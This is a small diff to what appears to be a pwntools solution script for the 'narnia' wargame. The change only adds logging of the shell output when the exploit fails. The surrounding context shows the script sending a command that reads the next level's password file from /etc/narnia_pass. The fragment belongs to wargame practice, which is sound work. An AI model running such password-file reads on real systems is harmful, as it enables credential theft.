@@ -17,6 +17,7 @@ if t == 'narnia2':
     s.sendline('cat /etc/narnia_pass/narnia2')
     log.success(s.recvuntil('$ ').decode().strip()[:-1])
 else:
+    log.critical(s.recvuntil('$ ').decode())
     log.critical('Exploit failed!!!')
 
 
